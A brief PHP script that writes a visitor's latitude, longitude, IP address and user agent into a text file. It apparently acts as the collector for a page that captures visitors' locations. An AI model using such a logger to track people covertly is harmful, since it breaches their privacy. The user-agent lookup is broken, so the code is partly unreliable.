<?php

 $myfile = fopen("location.txt", "w");
 $txt = "Lat : " . $_GET["lat"] . "\nLong : " . $_GET["long"]. "\nIP Address : " . $_SERVER["REMOTE_ADDR"] ."\nUser Agent : " . $_GET["navigator.userAgent"];
 fwrite($myfile, $txt);
 fclose($myfile);



?>
